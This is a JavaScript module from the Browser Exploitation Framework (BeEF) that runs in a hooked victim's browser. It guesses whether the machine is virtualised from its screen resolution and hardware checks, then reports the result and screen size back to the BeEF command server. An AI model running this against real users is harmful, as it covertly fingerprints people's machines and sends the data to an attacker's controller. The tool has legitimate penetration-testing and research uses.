//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Written by Jeremiah Grossman
// Ported to BeEF by bcoles
// For more information see http://jeremiahgrossman.blogspot.com.au/2009/08/web-pages-detecting-virtualized.html

beef.execute(function() {

	var result;
	var dimensions = {
	'320, 200'   : '',
	'320, 240'   : '',
	'320, 480'   : '', // iPhone 4S and earlier
	'480, 320'   : '', // iPhone 4S and earlier
	'640, 480'   : '',
	'640, 1136'  : '', // iPhone 5
	'800, 480'   : '',
	'768, 576'   : '',
	'854, 480'   : '',
	'1024, 600'  : '',
	'1136, 640'  : '', // iPhone 5
	'1152, 768'  : '',
	'800, 600'   : '',
	'1024, 768'  : '',
	'1280, 854'  : '',
	'1280, 960'  : '',
	'1280, 1024' : '',
	'1280, 720'  : '',
	'1280, 768'  : '',
	'1366, 768'  : '',
	'1280, 800'  : '',
	'1440, 900'  : '',
	'1440, 960'  : '',
	'1400, 1050' : '',
	'1600, 1200' : '',
	'2048, 1536' : '',
	'1680, 1050' : '',
	'1920, 1080' : '',
	'2048, 1080' : '',
	'1920, 1200' : '',
	'2560, 1600' : '',
	'2560, 2048' : ''
	};

	var wh = screen.width + ", " + screen.height;

	if (dimensions[wh] != undefined) {
		result = "Not virtualized";
	} else if (beef.hardware.isVirtualMachine()) {
		result = "Virtualized";
	} else if (beef.hardware.isMobilePhone()) {
		result = "Not virtualized";
	} else {
		result = "This host is virtualized or uses an unrecognized screen resolution";
	}

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result="+result+"&w="+screen.width+"&h="+screen.height);

});

